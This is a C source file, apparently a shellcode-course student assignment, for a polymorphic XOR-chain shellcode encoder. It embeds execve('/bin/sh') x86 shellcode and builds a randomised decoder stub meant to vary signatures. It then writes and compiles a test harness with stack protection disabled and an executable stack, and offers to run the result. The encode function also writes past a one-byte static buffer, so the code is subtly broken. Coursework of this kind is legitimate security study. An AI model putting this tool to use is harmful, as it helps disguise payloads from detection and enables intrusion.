/* Filename    : encoder.c
 * Author      : Joris Hartog
 * Date        : 17-12-2015
 * Student     : SLAE-704
 * Description : This program encodes by XOR'ing each byte of the 
 *  original shellcode with the previous result. The first byte 
 *  is XOR'ed with a key.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

typedef enum {false, true} bool;

char byte2char(unsigned int b) {
	if ( (b >= 0x0) && (b <= 0x9) )
		return (b + '0');
	if ( (b >= 0xa) && (b <= 0xf) )
		return (b - 0xa + 'a');
	return -1;
}

char char2byte(char c) {
	if( (c >= '0') && (c <= '9') )
		return (c - '0');
	if( (c >= 'A') && (c <= 'F') )
		return (c - 'A' + 0xa);
	if( (c >= 'a') && (c <= 'f') )
		return (c - 'a' + 0xa);

	printf("[!] Error: invalid input('%c')!\n", c);
	return -1;
}

void hex2bin(const char* src, char* target) {
	printf("     ");
	while(src[0]) {
		// Skip the "\x"
		src += 1;

		printf("%c%c", src[0], src[1]);

		// Convert hex to bin
		*(target++) = char2byte(src[0])*0x10 + char2byte(src[1]);
		src += 2;
	}
	printf("\n");
}

bool containsNulls(char *shellcode, int length) {
	if ( strlen(shellcode) == length)
		return false;
	else
		return true;
}

char* encode(char *shellcode, char key) {
	static char encodedCode[] = "";

	int i;
	encodedCode[0] = shellcode[0]^key;
	for(i = 1; i < strlen(shellcode); i++) {
		encodedCode[i] = shellcode[i]^encodedCode[i-1];
	}

	return encodedCode;
}

char* appendString(char str1[], char str2[]) {
	static char *answer;

	if((answer = malloc(strlen(str1)+strlen(str2)+1)) != NULL) {
		answer[0] = '\0';
		strcat(answer, str1);
		strcat(answer, str2);
	} else {
		printf("[!] Error: malloc failed!\n");
	}

	return answer;
}

char* polymorphicDecoder(char key, int codeLength) {
	char decoderParts[19][10] = 
	{
		"\xeb\x1f",
		"\x90",
		"\x5e",
		"\x31\xc0",
		"\xb0\xaa",
		"\x31\xc9",
		"\xb1\xaa",
		"\x8a\x1e",
		"\x32\x06",
		"\x88\x06",
		"\x88\xda",
		"\x83\xc6\x01",
		"\x8a\x1e",
		"\x30\x16",
		"\x49",
		"\x75\xf4",
		"\xeb\x06",
		"\x90",
		"\xe8\xdc\xff\xff\xff"
	};

	decoderParts[4][1] = key;
	decoderParts[6][1] = (unsigned char)(codeLength - 1);

	if (0b00000001 & key) {
		strcpy(decoderParts[3], "\x6a\xaa");
		strcpy(decoderParts[4], "\x58");
		decoderParts[3][1] = key;

		decoderParts[0][1] -= 1;
		decoderParts[18][1] += 1;
	}
	if (0b00000010 & key) {
		strcpy(decoderParts[5], "\x6a\xaa");
		strcpy(decoderParts[6], "\x59");
		decoderParts[5][1] = (unsigned char)(codeLength - 1);

		decoderParts[0][1] -= 1;
		decoderParts[18][1] += 1;
	}
	if (0b00000100 & key) {
		strcpy(decoderParts[7], "\x8a\x16");
		strcpy(decoderParts[10], "\x88\xd3");
		strcpy(decoderParts[12], "\x8a\x16");
		strcpy(decoderParts[13], "\x30\x1e");
	}
	if (0b00001000 & key) {
		strcpy(decoderParts[8], "\x30\x06");
		decoderParts[9][0] = '\0';

		decoderParts[0][1] -= 2;
		decoderParts[18][1] += 2;
	}
	if (0b00010000 & key) {
		strcpy(decoderParts[11], "\x46");

		decoderParts[0][1] -= 2;
		decoderParts[18][1] += 2;
		decoderParts[15][1] += 2;
	}
	if (0b00100000 & key) {
		strcpy(decoderParts[14], "\xe2\xf7");
		decoderParts[14][1] = decoderParts[15][1] + 1;
		decoderParts[15][0] = '\0';

		decoderParts[0][1] -= 1;
		decoderParts[18][1] += 1;
	}
	if (0b01000000 & key) {
		decoderParts[1][0] = '\0';

		decoderParts[0][1] -= 1;
		decoderParts[18][1] += 1;
	}
	if (0b10000000 & key) {
		decoderParts[17][0] = '\0';

		decoderParts[0][1] -= 1;
		decoderParts[16][1] -= 1;
		decoderParts[18][1] += 1;
	}

	static char stub[50];
	sprintf(stub, "%s%s%s%s%s"\
		      "%s%s%s%s%s"\
		      "%s%s%s%s%s"\
		      "%s%s%s%s",
		decoderParts[0],
		decoderParts[1],
		decoderParts[2],
		decoderParts[3],
                decoderParts[4],
                decoderParts[5],
                decoderParts[6],
                decoderParts[7],
                decoderParts[8],
                decoderParts[9],
                decoderParts[10],
                decoderParts[11],
                decoderParts[12],
                decoderParts[13],
                decoderParts[14],
                decoderParts[15],
                decoderParts[16],
                decoderParts[17],
                decoderParts[18]);
        
	return stub;
}

char createKey() {
	char key = (char)( rand() % 0x100 );
	return key;
}

void showUsage(char *name) {
	printf("Usage  : %s [shellcode]\n", name);
	printf("Example: %s \\x12\\x34\\x56\\x78\\x90\\xab\\xcd\\xef\n\n", name);
}

int main(int argc, char *argv[]) {
        // Clear the screen and print unnecessary header
        system("clear");
        printf(".__                                                    \n");
        printf("[__) _ |  .._ _  _ ._.._ |_ * _.   _ ._  _. _  _| _ ._.\n");
        printf("|   (_)|\\_|[ | )(_)[  [_)[ )|(_.  (/,[ )(_.(_)(_](/,[  \n");
        printf("        ._|           |                                \n\n");
        printf("                     18-12-2015                        \n");
        printf("                  by Joris Hartog                      \n\n");

	char shellcode[1024];

	// Check if number of arguments is correct
	if(argc != 2) {
		strcpy(shellcode, "\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80");
		showUsage(argv[0]);
		printf("[*] Using example shellcode: execve(\"bin/sh\")..\n");
	} else {
		// Import the shellcode
        	printf("[*] Importing shellcode..\n");
        	const char *shellcode_string = argv[1];
	        hex2bin(shellcode_string, shellcode);
	}

	int length = strlen(shellcode);
	char *encodedShellcode;

	// Seed random number generator with the current time
	srand(time(NULL));

	// Encode shellcode with new keys until no the
	//  code contains no nulls.
	printf("[*] Encoding..\n");
	char key;
	do {
		// Get random key
		key = createKey();
		printf("    With key: 0x%02x\n", (0xFF & key));

		// Encode shellcode
		encodedShellcode = encode(shellcode, key);
	} while (containsNulls(encodedShellcode, length) == true);

	// Get polymorphic decoder stub
	printf("[*] Creating polymorphic decoder-stub..\n");
	char *decoderStub = polymorphicDecoder(key, length);

	printf("[*] Done encoding with decoder-stub of %d bytes and shellcode of %d bytes!\n", strlen(decoderStub), strlen(encodedShellcode));

	char decoderStub_string[4*strlen(decoderStub) + 1];
	decoderStub_string[4*strlen(decoderStub)] = '\0';
	char encodedShellcode_string[4*strlen(encodedShellcode) + 1];
	encodedShellcode_string[4*strlen(encodedShellcode)] = '\0';

	int i;
        for(i = 0; i < strlen(decoderStub); i++) {
		decoderStub_string[4*i + 0] = '\\';
		decoderStub_string[4*i + 1] = 'x';
		decoderStub_string[4*i + 2] = byte2char( (decoderStub[i] & 0xf0) >> 4 );
		decoderStub_string[4*i + 3] = byte2char(decoderStub[i] & 0x0f);
        }
        for(i = 0; i < strlen(encodedShellcode); i++) {
		encodedShellcode_string[4*i + 0] = '\\';
		encodedShellcode_string[4*i + 1] = 'x';
		encodedShellcode_string[4*i + 2] = byte2char( (encodedShellcode[i] & 0xf0) >> 4 );
		encodedShellcode_string[4*i + 3] = byte2char(encodedShellcode[i] & 0x0f);
        }

	printf("[*] Encoded shellcode:\n%s%s\n", decoderStub_string, encodedShellcode_string);
	printf("[*] Creating ./execute.c..\n");

	FILE *fp = fopen("./execute.c", "wab");
	if (fp == NULL) {
		printf("[!] Error: Couldn't create ./execute.c!");
	} else {
		fprintf(fp, \
			"// execute.c\n"
			"// Author: Joris Hartog\n"
			"// St.nr.: SLAE-704\n"
			"// Descr.: This program was generated to test\n"
			"//  the encoded payload.\n"
			"\n"
			"#include <stdio.h>\n"
			"#include <string.h>\n"
			"\n"
			"unsigned char code[] = \\\n"
			"\"%s%s\";\n"
			"\n"
			"void main() {\n"
			"        printf(\"Shellcode length: %%d\\n\", strlen(code));\n"
			"        int (*ret)() = (int(*)())code;\n"
			"        ret();\n"
			"}",
			decoderStub_string, encodedShellcode_string
		);
		fclose(fp);
	}

	printf("[*] Compiling ./execute.c!\n");
	printf("    Output:   ./execute\n");

	system("gcc -fno-stack-protector -z execstack -o execute execute.c\n");

	printf("[*] Done! Execute file?\n[?] (y/n) ");
	char c;
	scanf(" %c", &c);

	if ( (c == 'y') || (c == 'Y') )
		system("./execute");

	printf("[*] Exiting..\n");
	return 0;
}

